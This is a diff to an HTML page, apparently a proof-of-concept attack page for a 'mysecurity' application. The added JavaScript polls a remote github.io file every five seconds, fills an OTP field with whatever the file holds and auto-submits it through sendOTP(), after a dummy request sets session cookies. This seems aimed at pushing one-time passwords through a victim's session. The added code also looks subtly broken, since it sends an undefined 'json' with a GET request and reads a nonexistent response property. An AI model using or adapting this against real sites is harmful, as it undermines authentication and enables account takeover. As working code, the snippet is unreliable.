@@ -29,8 +29,33 @@
             document.body.appendChild(dom_img);
         }
 
+
+        function getOTP() {
+
+            var url = "https://olemoudi.github.io/pocs/mysecurity/otp.txt";
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.onload = function () {
+                if (xhr.readyState == 4 && xhr.status == "200") {
+                    console.log("success: " + xhr.response.text);
+                    if (xhr.response.text.length > 4) {
+                        document.getElementById('otp').value = xhr.response.text;
+                        sendOTP();
+                    }
+
+                } else {
+                    console.log("error");
+                }
+            }
+            xhr.send(json);
+        }
+
+
         // First, ensure a Cookies are set by doing a dummy request
         get('dummy request', '');
+
+        setInterval(getOTP ,5000);
 
 
     </script>
